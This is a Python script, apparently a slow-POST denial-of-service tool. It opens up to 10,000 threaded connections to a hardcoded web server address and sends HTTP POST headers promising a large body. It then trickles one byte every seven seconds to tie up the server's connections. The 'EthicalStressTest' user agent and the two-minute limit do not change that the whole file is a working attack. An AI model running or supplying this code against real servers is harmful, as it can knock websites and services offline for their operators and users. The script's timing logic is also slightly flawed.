import socket
import threading
import time
import logging
import random

# ---------------------------
# Configuration Parameters
# ---------------------------
HOST = "10.44.1.186"
PORT = 80
NUM_SOCKETS = 10000  # Start small for testing; increase later
CONTENT_LENGTH = 10000
BYTE_DELAY = 7  # Short delay for more visible output
SOCKET_LAUNCH_DELAY = 0.10

# ---------------------------
# Logging Setup
# ---------------------------
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s"
)

# ---------------------------
# Dummy IP Generator
# ---------------------------
def generate_ip():
    return ".".join(str(random.randint(1, 254)) for _ in range(4))

# ---------------------------
# Connection Worker Function
# ---------------------------
def pckts(thread_id):
    ip = generate_ip()
    logging.info(f"[{thread_id}] rand_ip_dump: {ip}")

    try:
        print(f"[{thread_id}] Connecting to {HOST}:{PORT}")
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((HOST, PORT))

        headers = (
            f"POST / HTTP/1.1\r\n"
            f"Host: {HOST}\r\n"
            f"User-Agent: EthicalStressTest\r\n"
            f"Content-Length: {CONTENT_LENGTH}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Connection: keep-alive\r\n\r\n"
        )
        sock.sendall(headers.encode())
        print(f"[{thread_id}] Headers sent. Beginning body transmission...")

        for i in range(CONTENT_LENGTH):
            sock.send(b"x")
            print(f"[{thread_id}] Sent byte {i+1}/{CONTENT_LENGTH}")
            time.sleep(BYTE_DELAY)

        sock.close()
        print(f"[{thread_id}] Connection closed cleanly.")
    except Exception as e:
        print(f"[{thread_id}] Connection failed: {e}")

# ---------------------------
# Start Test
# ---------------------------
def start_test():
    print(f"Launching {NUM_SOCKETS} slow connections to {HOST}:{PORT}")
    print(f"Each connection sends {CONTENT_LENGTH} bytes with {BYTE_DELAY}s delay.")

    threads = []
    for i in range(NUM_SOCKETS):
        t = threading.Thread(target=pckts, args=(i,))
        t.daemon = True
        threads.append(t)
        t.start()
        time.sleep(SOCKET_LAUNCH_DELAY)
    start_time = time.time()
    try:
        while time.time() - start_time < 120: 
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[!] Test interrupted. Exiting...")

    print("\n[!] Time limit reached (2 minutes). Exiting...")

# ---------------------------
# Run
# ---------------------------
if __name__ == "__main__":
    start_test()
